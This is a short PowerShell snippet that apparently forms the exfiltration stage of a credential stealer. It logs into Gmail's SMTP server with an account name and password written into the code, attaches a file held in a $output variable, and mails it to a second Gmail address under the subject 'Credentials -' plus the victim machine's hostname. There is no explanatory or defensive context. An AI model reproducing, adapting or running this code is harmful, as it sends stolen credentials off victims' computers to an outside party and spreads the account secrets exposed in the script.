$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('jerrycarre4444@gmail.com', 'ourkindoftraitor')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'jerrycarre4444@gmail.com'
$ReportEmail.To.Add('warof1846@gmail.com')
$ReportEmail.Subject = 'Credentials - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
$ReportEmail.Attachments.Add("$output")
$SMTPInfo.Send($ReportEmail)
